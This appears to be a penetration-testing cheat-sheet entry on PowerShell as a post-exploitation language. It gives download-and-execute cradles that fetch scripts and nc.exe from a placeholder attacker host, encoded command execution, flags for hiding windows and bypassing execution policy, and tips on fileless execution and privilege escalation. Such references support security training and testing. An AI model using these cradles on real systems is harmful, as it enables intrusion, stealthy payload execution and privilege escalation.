---
slug: powershell
name: PowerShell
category: Windows & AD
icon: powershell
tags: [windows, shell, download-cradle, enumeration, post-exploitation, encoded]
oneLiner: Windows' scripting shell and the de-facto post-exploitation language. Download payloads, enumerate the host and run tooling without touching disk.
---

## Common usage

Download-and-execute cradle
```sh
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')"
```

Download a file to disk
```sh
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<LHOST>/nc.exe','C:\\Windows\\Temp\\nc.exe')"
```

Run a base64-encoded command
```sh
powershell -enc <BASE64>
```

## Key parameters

| Flag | What it does |
| --- | --- |
| `-c <cmd>` | Run a command string and exit |
| `-enc <b64>` | Run a base64 (UTF-16LE) encoded command |
| `-ep bypass` | Set execution policy to Bypass for this process |
| `-nop` | No profile — skip user profile scripts |
| `-w hidden` | Hidden window style |

## More flags

| Flag | What it does |
| --- | --- |
| `-File <path>` | Run a script file |
| `IEX` | Invoke-Expression — execute a downloaded string in memory |
| `Get-Content` | Read a file (cat equivalent) |
| `whoami /priv` | List the current token's privileges |
| `Get-LocalUser` | Enumerate local accounts |
| `iwr <url> -o <f>` | Invoke-WebRequest download (modern cradle) |

## Gotchas & tips

- Execution policy is not a security boundary. -ep bypass (or -enc) sidesteps it without admin rights.
- -enc expects UTF-16LE base64, not plain base64 — encode with iconv or PowerShell's [Convert]::ToBase64String.
- The DownloadString + IEX cradle runs entirely in memory, leaving no payload file on disk.
- Check whoami /priv after landing — SeImpersonatePrivilege opens the door to Potato-style SYSTEM escalation.
